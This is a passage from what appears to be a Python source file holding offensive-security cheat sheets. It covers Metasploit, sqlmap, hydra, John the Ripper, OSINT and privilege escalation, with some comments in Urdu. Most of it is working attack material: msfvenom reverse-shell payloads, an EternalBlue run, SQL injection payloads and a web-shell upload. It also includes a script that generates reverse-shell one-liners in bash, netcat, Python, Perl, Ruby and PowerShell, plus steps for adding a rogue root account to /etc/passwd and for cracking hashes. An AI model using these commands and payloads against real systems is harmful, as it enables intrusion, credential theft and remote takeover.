   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o payload
   msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > shell.php

════════════════════════════════════════
 METERPRETER COMMANDS
════════════════════════════════════════

   sysinfo                         # System information
   getuid                          # Current user
   getpid                          # Process ID
   ps                              # List processes
   migrate <PID>                   # Migrate to process

   ls                              # List files
   pwd                             # Current directory
   cd <dir>                        # Change directory
   upload <file>                   # Upload file
   download <file>                 # Download file

   shell                           # Drop to system shell
   execute -f cmd.exe -i           # Execute program

   hashdump                        # Dump password hashes
   keyscan_start                   # Start keylogger
   keyscan_dump                    # Dump keystrokes
   screenshot                      # Take screenshot
   webcam_snap                     # Webcam snapshot

   getsystem                       # Auto privilege escalation
   getuid                          # Check if got root

   run post/multi/manage/shell_to_meterpreter  # Upgrade shell

════════════════════════════════════════
 DATABASE COMMANDS
════════════════════════════════════════

   db_status                       # Check DB connection
   workspace                       # List workspaces
   workspace -a <name>             # Create workspace
   db_nmap -sV <IP>               # Nmap + save to DB
   hosts                           # List discovered hosts
   services                        # List discovered services
   vulns                           # List vulnerabilities
   creds                           # List credentials

════════════════════════════════════════
 COMMON EXPLOITS
════════════════════════════════════════

   # EternalBlue (MS17-010) - Windows SMB:
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS <IP>
   set LHOST <YOUR_IP>
   run

   # Apache Struts:
   use exploit/multi/http/struts2_content_type_ognl

   # WordPress:
   use exploit/unix/webapp/wp_admin_shell_upload
""",

    # ==================== SQL INJECTION ====================
    "sqlmap": """
╔══════════════════════════════════════════════════════════════════╗
║                💉 SQLMAP - COMPLETE SQL INJECTION               ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 BASIC USAGE
════════════════════════════════════════

   sqlmap -u "http://target.com/page?id=1"    # Basic test
   sqlmap -u "URL" --dbs                      # List databases
   sqlmap -u "URL" -D dbname --tables         # List tables
   sqlmap -u "URL" -D dbname -T users --dump  # Dump table
   sqlmap -u "URL" --dump-all                 # Dump everything

════════════════════════════════════════
 AUTHENTICATION & SESSIONS
════════════════════════════════════════

   sqlmap -u "URL" --cookie="PHPSESSID=abc123"
   sqlmap -u "URL" -H "Authorization: Bearer <token>"
   sqlmap -u "URL" --auth-type=Basic --auth-cred=admin:pass

════════════════════════════════════════
 POST REQUESTS
════════════════════════════════════════

   sqlmap -u "URL" --data="username=admin&password=pass"
   sqlmap -r request.txt              # Use saved Burp request

════════════════════════════════════════
 ADVANCED OPTIONS
════════════════════════════════════════

   sqlmap -u "URL" --level=5 --risk=3     # More thorough scan
   sqlmap -u "URL" --random-agent          # Random user agent
   sqlmap -u "URL" --tor                  # Use Tor
   sqlmap -u "URL" --proxy=http://127.0.0.1:8080
   sqlmap -u "URL" --batch                # Auto yes to prompts
   sqlmap -u "URL" --threads=10           # Faster

════════════════════════════════════════
 SPECIAL TECHNIQUES
════════════════════════════════════════

   sqlmap -u "URL" --technique=BEUSTQ    # All techniques
   # B = Boolean-based blind
   # E = Error-based
   # U = Union query-based
   # S = Stacked queries
   # T = Time-based blind
   # Q = Inline queries

════════════════════════════════════════
 OS ACCESS
════════════════════════════════════════

   sqlmap -u "URL" --os-shell           # OS shell
   sqlmap -u "URL" --os-cmd="id"        # Run OS command
   sqlmap -u "URL" --file-read="/etc/passwd"
   sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

════════════════════════════════════════
 MANUAL SQL INJECTION PAYLOADS
════════════════════════════════════════

   # Test payloads:
   '                     # Single quote test
   "                     # Double quote test
   1' OR '1'='1          # Boolean bypass
   1' OR 1=1--           # Comment out rest
   ' UNION SELECT 1,2,3-- # UNION test

   # Find column count:
   1 ORDER BY 1--
   1 ORDER BY 2--

   # UNION attack:
   1 UNION SELECT username,password FROM users--

   # Error-based:
   1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))
""",

    # ==================== HYDRA ====================
    "hydra": """
╔══════════════════════════════════════════════════════════════════╗
║              🔑 HYDRA - BRUTE FORCE COMPLETE GUIDE              ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 BASIC SYNTAX
════════════════════════════════════════

   hydra -l <user> -p <pass> <target> <service>
   hydra -L users.txt -P pass.txt <target> <service>
   hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> ssh

════════════════════════════════════════
 SSH BRUTE FORCE
════════════════════════════════════════

   hydra -l root -P rockyou.txt ssh://192.168.1.1
   hydra -l admin -P pass.txt 192.168.1.1 ssh -t 4 -V
   hydra -L users.txt -P pass.txt ssh://192.168.1.1 -s 2222

════════════════════════════════════════
 FTP BRUTE FORCE
════════════════════════════════════════

   hydra -l admin -P rockyou.txt ftp://192.168.1.1
   hydra -L users.txt -P pass.txt 192.168.1.1 ftp -V

════════════════════════════════════════
 HTTP BRUTE FORCE
════════════════════════════════════════

   # HTTP GET:
   hydra -l admin -P rockyou.txt http-get://192.168.1.1/admin

   # HTTP POST:
   hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form \
   "/login:username=^USER^&password=^PASS^:Invalid credentials"

   # HTTP Form (with cookies):
   hydra -l admin -P rockyou.txt 192.168.1.1 http-post-form \
   "/login:user=^USER^&pass=^PASS^:F=Wrong:H=Cookie: session=abc"

════════════════════════════════════════
 OTHER SERVICES
════════════════════════════════════════

   hydra -l admin -P pass.txt 192.168.1.1 mysql    # MySQL
   hydra -l admin -P pass.txt 192.168.1.1 rdp      # RDP
   hydra -l admin -P pass.txt 192.168.1.1 smb      # SMB
   hydra -l user -P pass.txt smtp://192.168.1.1    # SMTP
   hydra -l admin -P pass.txt 192.168.1.1 telnet   # Telnet

════════════════════════════════════════
 OPTIONS
════════════════════════════════════════

   -t 16       # Threads (parallel connections)
   -V          # Verbose (show attempts)
   -v          # Verbose
   -f          # Stop after first found
   -o out.txt  # Save output
   -s PORT     # Custom port
   -x 6:8:a    # Password generation min:max:charset

════════════════════════════════════════
 WORDLISTS
════════════════════════════════════════

   /usr/share/wordlists/rockyou.txt
   /usr/share/wordlists/fasttrack.txt
   /usr/share/wordlists/metasploit/unix_users.txt
   /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
""",

    # ==================== GOBUSTER ====================
    "gobuster": """
╔══════════════════════════════════════════════════════════════════╗
║           🔍 GOBUSTER - COMPLETE DIRECTORY BRUTING              ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 DIRECTORY SCANNING
════════════════════════════════════════

   gobuster dir -u http://target.com -w wordlist.txt
   gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js
   gobuster dir -u http://target.com -w wordlist.txt -t 50     # 50 threads
   gobuster dir -u http://target.com -w wordlist.txt -o out.txt # Save output
   gobuster dir -u http://target.com -w wordlist.txt -k         # Skip TLS errors

════════════════════════════════════════
 DNS SUBDOMAIN BRUTING
════════════════════════════════════════

   gobuster dns -d target.com -w wordlist.txt
   gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

════════════════════════════════════════
 VHOST DISCOVERY
════════════════════════════════════════

   gobuster vhost -u http://target.com -w wordlist.txt
   gobuster vhost -u http://target.com -w wordlist.txt -t 30

════════════════════════════════════════
 COMMON WORDLISTS
════════════════════════════════════════

   /usr/share/wordlists/dirb/common.txt
   /usr/share/wordlists/dirb/big.txt
   /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
   /usr/share/wordlists/dirbuster/directory-list-2.3-large.txt
   /usr/share/seclists/Discovery/Web-Content/common.txt

════════════════════════════════════════
 OPTIONS
════════════════════════════════════════

   -u          Target URL
   -w          Wordlist
   -x          File extensions (php,html,txt)
   -t          Threads (default 10)
   -s          Valid status codes (200,302,etc)
   -b          Blacklist status codes
   -o          Output file
   -v          Verbose
   --timeout   Request timeout
   -H          Custom header
   -c          Cookie
   -k          Skip TLS verification
""",

    # ==================== JOHN THE RIPPER ====================
    "john": """
╔══════════════════════════════════════════════════════════════════╗
║           🔓 JOHN THE RIPPER - PASSWORD CRACKING                ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 BASIC USAGE
════════════════════════════════════════

   john hash.txt                              # Auto-detect & crack
   john --wordlist=rockyou.txt hash.txt       # Dictionary attack
   john --rules --wordlist=rockyou.txt hash.txt # With rules
   john --show hash.txt                       # Show cracked
   john --show --format=md5 hash.txt          # Show with format

════════════════════════════════════════
 HASH FORMATS
════════════════════════════════════════

   john --format=md5 hash.txt
   john --format=sha1 hash.txt
   john --format=sha256 hash.txt
   john --format=bcrypt hash.txt
   john --format=NT hash.txt            # Windows NTLM
   john --format=ssh hash.txt           # SSH private key
   john --format=zip hash.txt           # ZIP password
   john --list=formats                  # List all formats

════════════════════════════════════════
 LINUX PASSWORD CRACKING
════════════════════════════════════════

   # Combine shadow and passwd:
   unshadow /etc/passwd /etc/shadow > hashes.txt
   john --wordlist=rockyou.txt hashes.txt

════════════════════════════════════════
 ZIP/RAR CRACKING
════════════════════════════════════════

   zip2john file.zip > zip_hash.txt
   john --wordlist=rockyou.txt zip_hash.txt

   rar2john file.rar > rar_hash.txt
   john --wordlist=rockyou.txt rar_hash.txt

════════════════════════════════════════
 SSH KEY CRACKING
════════════════════════════════════════

   ssh2john id_rsa > id_rsa_hash.txt
   john --wordlist=rockyou.txt id_rsa_hash.txt

════════════════════════════════════════
 HASHCAT (Alternative)
════════════════════════════════════════

   hashcat -m 0 hash.txt rockyou.txt          # MD5
   hashcat -m 100 hash.txt rockyou.txt        # SHA1
   hashcat -m 1400 hash.txt rockyou.txt       # SHA256
   hashcat -m 1000 hash.txt rockyou.txt       # NTLM (Windows)
   hashcat -m 1800 hash.txt rockyou.txt       # SHA512crypt (Linux)
   hashcat -m 3200 hash.txt rockyou.txt       # bcrypt

   # Attack modes:
   -a 0   # Dictionary attack
   -a 1   # Combination attack
   -a 3   # Brute force (mask attack)

   # Brute force example:
   hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a   # 6 char all types
   # ?l = lowercase, ?u = uppercase, ?d = digits, ?s = special, ?a = all
""",

    # ==================== PYTHON SCRIPTS ====================
    "generate script": """
╔══════════════════════════════════════════════════════════════════╗
║              🐍 PROFESSIONAL PYTHON SCRIPTS                     ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 SCRIPT 1: PORT SCANNER
════════════════════════════════════════

#!/usr/bin/env python3
import socket
import threading
from datetime import datetime

def scan_port(host, port, open_ports):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        if s.connect_ex((host, port)) == 0:
            try:
                service = socket.getservbyport(port)
            except:
                service = "unknown"
            open_ports.append((port, service))
            print(f"  [+] Port {port:5d}/tcp  OPEN  ({service})")
        s.close()
    except:
        pass

def main():
    host = input("Enter target IP: ")
    print(f"\\nScanning {host} at {datetime.now()}")
    print("-" * 40)

    open_ports = []
    threads = []

    for port in range(1, 1025):
        t = threading.Thread(target=scan_port, args=(host, port, open_ports))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(f"\\nTotal open ports: {len(open_ports)}")

if __name__ == "__main__":
    main()

════════════════════════════════════════
 SCRIPT 2: DIRECTORY BRUTEFORCER
════════════════════════════════════════

#!/usr/bin/env python3
import requests
import sys
from concurrent.futures import ThreadPoolExecutor

def check_dir(base_url, path):
    url = f"{base_url}/{path.strip()}"
    try:
        r = requests.get(url, timeout=5, allow_redirects=False)
        if r.status_code in [200, 301, 302, 403]:
            print(f"  [+] {r.status_code} -> {url}")
            return url
    except:
        pass
    return None

def main():
    url = input("Enter URL (http://target.com): ")
    wordlist = input("Enter wordlist path: ")

    try:
        with open(wordlist, 'r', errors='ignore') as f:
            paths = f.readlines()
    except FileNotFoundError:
        print("Wordlist not found!")
        sys.exit(1)

    print(f"\\nBruting {url} with {len(paths)} paths...")
    print("-" * 50)

    with ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(lambda p: check_dir(url, p), paths)

if __name__ == "__main__":
    main()

════════════════════════════════════════
 SCRIPT 3: HASH IDENTIFIER & CRACKER
════════════════════════════════════════

#!/usr/bin/env python3
import hashlib
import re

def identify_hash(hash_str):
    length = len(hash_str)
    patterns = {
        32: "MD5",
        40: "SHA1",
        56: "SHA224",
        64: "SHA256",
        96: "SHA384",
        128: "SHA512"
    }
    return patterns.get(length, "Unknown")

def crack_hash(hash_str, wordlist_path):
    hash_type = identify_hash(hash_str)
    print(f"[*] Hash Type: {hash_type}")
    print(f"[*] Cracking...")

    hash_map = {
        "MD5": hashlib.md5,
        "SHA1": hashlib.sha1,
        "SHA256": hashlib.sha256,
    }

    if hash_type not in hash_map:
        print("[-] Hash type not supported for cracking")
        return

    hash_func = hash_map[hash_type]

    try:
        with open(wordlist_path, 'r', errors='ignore') as f:
            for line in f:
                word = line.strip()
                if hash_func(word.encode()).hexdigest() == hash_str.lower():
                    print(f"[+] CRACKED! Password: {word}")
                    return word
    except FileNotFoundError:
        print("[-] Wordlist not found!")

    print("[-] Password not found in wordlist")

if __name__ == "__main__":
    h = input("Enter hash: ")
    w = input("Enter wordlist (/usr/share/wordlists/rockyou.txt): ")
    crack_hash(h, w)

════════════════════════════════════════
 SCRIPT 4: REVERSE SHELL GENERATOR
════════════════════════════════════════

#!/usr/bin/env python3
def generate_shells(ip, port):
    shells = {
        "Bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "Python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\"])'",
        "PHP": f'php -r \\'$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");\\'',
        "Netcat": f"nc -e /bin/bash {ip} {port}",
        "Netcat-BusyBox": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f",
        "Perl": f'perl -e \\'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");\\'',
        "Ruby": f'ruby -rsocket -e\\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)\\'',
        "PowerShell": f"powershell -nop -c \\"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\\""
    }

    print(f"\\n{'='*60}")
    print(f"  REVERSE SHELLS for {ip}:{port}")
    print('='*60)
    for name, shell in shells.items():
        print(f"\\n[{name}]")
        print(f"  {shell}")
    print(f"\\n[Listener] nc -lvnp {port}")

ip = input("Your IP: ")
port = input("Port (4444): ") or "4444"
generate_shells(ip, port)
""",

    # ==================== BURP SUITE ====================
    "burpsuite": """
╔══════════════════════════════════════════════════════════════════╗
║              🔍 BURP SUITE - COMPLETE WEB TESTING               ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 SETUP
════════════════════════════════════════

   1. Open Burp Suite
   2. Proxy → Options → Listen on 127.0.0.1:8080
   3. Browser: Set proxy to 127.0.0.1:8080
   4. Visit http://burpsuite → Download & install CA certificate
   5. Import CA cert in browser settings

════════════════════════════════════════
 PROXY TAB
════════════════════════════════════════

   • Intercept ON/OFF: Toggle request capture
   • Forward: Send request to server
   • Drop: Discard request
   • Right-click → Send to Repeater/Intruder/Scanner

════════════════════════════════════════
 REPEATER TAB
════════════════════════════════════════

   • Manually modify and resend requests
   • Test different parameter values
   • Perfect for manual SQL injection testing
   • Shortcut: Ctrl+R to send to Repeater

════════════════════════════════════════
 INTRUDER TAB (Fuzzing/Brute Force)
════════════════════════════════════════

   1. Send request to Intruder (Ctrl+I)
   2. Positions tab → Add § around parameters
   3. Payloads tab → Add wordlist
   4. Attack types:
      • Sniper: One position, one payload list
      • Battering Ram: All positions, same payload
      • Pitchfork: Multiple lists, one per position
      • Cluster Bomb: All combinations
   5. Start Attack
   6. Sort by Status Code or Length

════════════════════════════════════════
 SCANNER (Pro Version)
════════════════════════════════════════

   • Active Scan: Automatically test for vulnerabilities
   • Passive Scan: Analyze traffic for issues
   • Reports: Generate HTML/XML reports

════════════════════════════════════════
 DECODER TAB
════════════════════════════════════════

   • URL encode/decode
   • Base64 encode/decode
   • HTML encode/decode
   • Hex encode/decode
   • Gzip compress/decompress

════════════════════════════════════════
 USEFUL TIPS
════════════════════════════════════════

   → Always check response headers for info
   → Look for hidden parameters in responses
   → Test for IDOR by changing user IDs
   → Check for XSS in all input fields
   → Test CSRF by removing CSRF tokens
   → Look for JWT tokens and decode them
   → Check for sensitive data in cookies
""",

    # ==================== LINUX COMMANDS ====================
    "linux commands": """
╔══════════════════════════════════════════════════════════════════╗
║              🐧 LINUX - COMPLETE COMMANDS GUIDE                 ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 FILE & DIRECTORY OPERATIONS
════════════════════════════════════════

   ls -la              # List all files with details
   ls -lah             # Human readable sizes
   cd /path/to/dir     # Change directory
   cd ..               # Go up one level
   cd ~                # Go to home directory
   pwd                 # Print current directory

   mkdir folder        # Create directory
   mkdir -p a/b/c      # Create nested directories
   rmdir folder        # Remove empty directory
   rm file.txt         # Remove file
   rm -rf folder/      # Force remove directory
   cp file1 file2      # Copy file
   cp -r dir1 dir2     # Copy directory
   mv file1 file2      # Move/rename file
   touch file.txt      # Create empty file

   find / -name "*.txt"            # Find files
   find / -type f -name "passwd"   # Find specific
   find / -perm /4000 2>/dev/null  # Find SUID files
   locate filename                  # Quick find
   which command                    # Find command path

════════════════════════════════════════
 FILE VIEWING & EDITING
════════════════════════════════════════

   cat file.txt        # Display file content
   less file.txt       # Page through file (q to quit)
   more file.txt       # Page through file
   head -n 10 file     # First 10 lines
   tail -n 10 file     # Last 10 lines
   tail -f log.txt     # Follow log file live
   grep "word" file    # Search in file
   grep -r "word" /dir # Recursive search
   grep -i "word" file # Case insensitive
   grep -n "word" file # Show line numbers
   grep -v "word" file # Inverse match

   nano file.txt       # Simple editor
   vim file.txt        # Advanced editor
   # VIM: i=insert, Esc=exit insert, :wq=save&quit, :q!=force quit

════════════════════════════════════════
 USER & PERMISSIONS
════════════════════════════════════════

   whoami              # Current user
   id                  # User ID info
   who                 # Logged in users
   users               # List users
   adduser username    # Add user
   passwd username     # Change password
   usermod -aG sudo u  # Add to sudo group
   su username         # Switch user
   sudo command        # Run as root

   chmod 755 file      # Change permissions
   chmod +x file       # Make executable
   chmod -R 777 dir/   # Recursive
   chown user file     # Change owner
   chown user:group f  # Change owner & group

   # Permission numbers:
   # 4=read, 2=write, 1=execute
   # 7=rwx, 6=rw-, 5=r-x, 4=r--

════════════════════════════════════════
 PROCESS MANAGEMENT
════════════════════════════════════════

   ps aux              # All processes
   ps aux | grep app   # Find specific process
   top                 # Live process monitor
   htop                # Better process monitor
   kill <PID>          # Kill by PID
   kill -9 <PID>       # Force kill
   killall firefox     # Kill by name

   & at end            # Run in background
   jobs                # List background jobs
   fg %1               # Bring to foreground
   bg %1               # Send to background
   nohup command &     # Run after logout

════════════════════════════════════════
 NETWORK COMMANDS
════════════════════════════════════════

   ip a                # Show IP addresses
   ip r                # Show routing table
   ifconfig            # Interface configuration
   netstat -tulpn      # Open ports
   ss -tulpn           # Socket statistics
   ping -c 4 target    # Ping test
   traceroute target   # Trace route
   curl http://url     # HTTP request
   wget http://url     # Download file
   nslookup domain     # DNS lookup
   dig domain          # DNS info
   whois domain        # Domain info
   arp -a              # ARP table

════════════════════════════════════════
 SYSTEM INFORMATION
════════════════════════════════════════

   uname -a            # Kernel version
   cat /etc/os-release # OS info
   hostname            # Hostname
   uptime              # System uptime
   df -h               # Disk usage
   du -sh folder/      # Folder size
   free -h             # RAM usage
   lscpu               # CPU info
   lsblk               # Block devices
   dmidecode           # Hardware info

════════════════════════════════════════
 REDIRECTION & PIPES
════════════════════════════════════════

   >                   # Redirect output (overwrite)
   >>                  # Redirect output (append)
   <                   # Redirect input
   |                   # Pipe output to next command
   2>                  # Redirect errors
   2>/dev/null         # Discard errors
   &>                  # Redirect all output

   # Examples:
   ls -la > files.txt
   echo "text" >> file.txt
   cat file | grep "word"
   nmap -sV target 2>/dev/null
""",

    # ==================== OSINT ====================
    "osint": """
╔══════════════════════════════════════════════════════════════════╗
║              🕵️ OSINT - INTELLIGENCE GATHERING                  ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 WHAT IS OSINT?
════════════════════════════════════════

   OSINT = Open Source Intelligence
   Publicly available information ko collect karna.
   Ye LEGAL hai kyun ke public data use hoti hai.

════════════════════════════════════════
 TOOLS
════════════════════════════════════════

   theHarvester -d domain.com -b all    # Email/subdomain harvester
   maltego                               # Visual OSINT (GUI)
   recon-ng                              # Recon framework
   shodan                                # Internet device search
   spiderfoot                            # Auto OSINT

════════════════════════════════════════
 GOOGLE DORKS
════════════════════════════════════════

   site:target.com                      # Search specific site
   filetype:pdf site:target.com         # Find PDFs
   inurl:admin site:target.com          # Admin pages
   intitle:"index of" site:target.com   # Directory listings
   "password" filetype:txt              # Password files
   inurl:login site:target.com          # Login pages
   site:target.com ext:sql              # SQL files
   intext:"username" site:target.com    # Find usernames

════════════════════════════════════════
 EMAIL INVESTIGATION
════════════════════════════════════════

   # theHarvester:
   theHarvester -d target.com -b google,bing,linkedin

   # Hunter.io (website): Find emails for domain
   # Phonebook.cz: Email search
   # Verify emails: email-checker.net

════════════════════════════════════════
 SOCIAL MEDIA OSINT
════════════════════════════════════════

   # Username search across platforms:
   sherlock username                    # Find username everywhere

   # Tools:
   # namechk.com     - Username availability
   # knowem.com       - Social media presence
   # socialsearcher.com

════════════════════════════════════════
 SHODAN
════════════════════════════════════════

   # Website: shodan.io
   shodan search "apache 2.4" country:PK     # Pakistan Apache servers
   shodan search "default password"           # Devices with default pass
   shodan search port:22 country:US           # SSH in US

   # CLI:
   pip install shodan
   shodan init <API_KEY>
   shodan search "webcamxp"                   # IP cameras

════════════════════════════════════════
 WHOIS & DNS
════════════════════════════════════════

   whois target.com                     # Domain registration info
   dig target.com ANY                   # All DNS records
   dig target.com MX                    # Mail servers
   dig target.com NS                    # Name servers
   dnsenum target.com                   # DNS enumeration
   fierce --domain target.com           # DNS brute force
   nslookup -type=ANY target.com        # DNS lookup
""",

    # ==================== JOHN ====================
    "privilege escalation": """
╔══════════════════════════════════════════════════════════════════╗
║              🚀 PRIVILEGE ESCALATION - COMPLETE                 ║
╚══════════════════════════════════════════════════════════════════╝

════════════════════════════════════════
 LINUX PRIVESC
════════════════════════════════════════

🔍 ENUMERATION FIRST:
   whoami && id              # Who are you?
   hostname                  # Machine name
   uname -a                  # Kernel version
   cat /etc/os-release       # OS version
   cat /etc/passwd           # Users list
   cat /etc/shadow           # Hashes (if readable)
   sudo -l                   # What can you sudo?
   groups                    # Your groups

📋 SUDO EXPLOITATION:
   # Check: sudo -l

   # If sudo su or sudo -i available → root!
   sudo su
   sudo -i
   sudo /bin/bash

   # If sudo vim → :!/bin/bash
   sudo vim → :!/bin/bash

   # If sudo find:
   sudo find . -exec /bin/bash \\; -quit

   # If sudo python:
   sudo python3 -c 'import os; os.system("/bin/bash")'

   # Visit: gtfobins.github.io for ALL sudo bypasses

🔖 SUID EXPLOITATION:
   # Find SUID binaries:
   find / -perm -u=s -type f 2>/dev/null

   # Common SUID exploits:
   # /usr/bin/find:
   find . -exec /bin/bash \\; -quit

   # /usr/bin/vim:
   vim -c ':!/bin/bash'

   # /usr/bin/python:
   python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

📅 CRON JOB EXPLOITATION:
   cat /etc/crontab
   ls -la /etc/cron.*

   # If cron job runs script as root and you can write to it:
   echo "chmod +s /bin/bash" >> /path/to/script.sh
   # Wait for cron to run
   /bin/bash -p  # Root shell!

🔑 WRITABLE /etc/passwd:
   # If /etc/passwd is writable:
   openssl passwd -1 -salt xyz password123
   # Add line: hacker:$1$xyz$...:0:0:root:/root:/bin/bash
   echo 'hacker:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
   su hacker  # Root!

🏃 AUTOMATED TOOLS:
   # LinPEAS (Best):
   wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
   chmod +x linpeas.sh
   ./linpeas.sh | tee linpeas_output.txt

   # LinEnum:
   wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
   chmod +x LinEnum.sh
   ./LinEnum.sh

════════════════════════════════════════
 WINDOWS PRIVESC
════════════════════════════════════════

🔍 ENUMERATION:
   whoami /all              # Privileges
   systeminfo               # System info
   net user                 # All users
   net localgroup administrators  # Admin group
   wmic os get osarchitecture     # 32/64 bit
   ipconfig /all            # Network info
   netstat -ano             # Open connections

📋 TOKEN IMPERSONATION:
   # If SeImpersonatePrivilege enabled:
   .\PrintSpoofer.exe -i -c cmd         # PrintSpoofer
   .\JuicyPotatoNG.exe -t * -p cmd.exe  # JuicyPotato

🔑 UNQUOTED SERVICE PATHS:
   wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\"
   # Find path without quotes with space
   # Place malicious exe in path

🗂️ REGISTRY:
   reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
   # Look for DefaultPassword

🏃 AUTOMATED TOOLS:
   .\WinPEAS.exe            # Best Windows tool
   .\PowerUp.ps1            # PowerShell privesc
   Invoke-AllChecks         # PowerUp command
"""
}

# ====================== KALI COMMANDS DATABASE (EXPANDED) ======================
KALI_COMMANDS = {
    "nmap": {"desc": "Network port scanner", "example": "nmap -sC -sV -p- <IP>", "category": "Recon"},
    "gobuster": {"desc": "Directory/subdomain bruter", "example": "gobuster dir -u http://target -w wordlist.txt",
                 "category": "Recon"},
    "dirb": {"desc": "Web content scanner", "example": "dirb http://target.com /usr/share/wordlists/dirb/common.txt",
             "category": "Recon"},
    "ffuf": {"desc": "Fast web fuzzer", "example": "ffuf -w wordlist.txt -u http://target/FUZZ", "category": "Recon"},
    "sqlmap": {"desc": "SQL injection tool", "example": "sqlmap -u 'URL?id=1' --dbs", "category": "Web"},
    "nikto": {"desc": "Web vulnerability scanner", "example": "nikto -h http://target.com", "category": "Web"},
    "metasploit": {"desc": "Exploitation framework", "example": "msfconsole", "category": "Exploit"},
    "msfvenom": {"desc": "Payload generator",
                 "example": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe",
                 "category": "Exploit"},
    "hydra": {"desc": "Network brute forcer", "example": "hydra -l admin -P rockyou.txt target ssh",
              "category": "Passwords"},
    "john": {"desc": "Password hash cracker", "example": "john --wordlist=rockyou.txt hash.txt",
             "category": "Passwords"},
    "hashcat": {"desc": "GPU hash cracker", "example": "hashcat -m 0 hash.txt rockyou.txt", "category": "Passwords"},
    "burpsuite": {"desc": "Web app proxy/tester", "example": "burpsuite", "category": "Web"},
    "wireshark": {"desc": "Network packet analyzer", "example": "wireshark", "category": "Network"},
    "tcpdump": {"desc": "CLI packet capture", "example": "tcpdump -i eth0 -w capture.pcap", "category": "Network"},
    "netcat": {"desc": "Network swiss army knife", "example": "nc -lvnp 4444", "category": "Network"},
    "enum4linux": {"desc": "SMB enumeration", "example": "enum4linux -a target_ip", "category": "Enum"},
    "smbclient": {"desc": "SMB client", "example": "smbclient -L //target -N", "category": "Enum"},
    "wfuzz": {"desc": "Web fuzzer", "example": "wfuzz -c -z file,wordlist.txt http://target/FUZZ", "category": "Web"},
    "linpeas": {"desc": "Linux privilege escalation", "example": "./linpeas.sh | tee output.txt",
                "category": "PrivEsc"},
    "winpeas": {"desc": "Windows privilege escalation", "example": ".\\winPEAS.exe", "category": "PrivEsc"},
    "searchsploit": {"desc": "Exploit database search", "example": "searchsploit apache 2.4", "category": "Exploit"},
    "aircrack-ng": {"desc": "WiFi security auditing", "example": "aircrack-ng -w rockyou.txt capture.cap",
                    "category": "Wireless"},
    "airodump-ng": {"desc": "WiFi packet capture", "example": "airodump-ng wlan0mon", "category": "Wireless"},
    "theHarvester": {"desc": "Email/domain OSINT", "example": "theHarvester -d target.com -b all", "category": "OSINT"},
    "sherlock": {"desc": "Username OSINT tool", "example": "python3 sherlock.py username", "category": "OSINT"},
    "maltego": {"desc": "Visual OSINT mapping", "example": "maltego", "category": "OSINT"},
    "volatility": {"desc": "Memory forensics", "example": "volatility -f memory.dmp imageinfo",
                   "category": "Forensics"},
    "autopsy": {"desc": "Digital forensics GUI", "example": "autopsy", "category": "Forensics"},
    "ghidra": {"desc": "Reverse engineering tool", "example": "ghidra", "category": "RE"},
    "gdb": {"desc": "GNU debugger", "example": "gdb ./binary", "category": "RE"},
    "strace": {"desc": "System call tracer", "example": "strace ./binary", "category": "RE"},
    "tcpdump": {"desc": "CLI packet sniffer", "example": "tcpdump -i eth0 -w out.pcap", "category": "Network"},
    "responder": {"desc": "LLMNR/NBT-NS poisoner", "example": "responder -I eth0 -rdwv", "category": "Network"},
    "crackmapexec": {"desc": "Post-exploitation tool", "example": "crackmapexec smb 192.168.1.0/24",
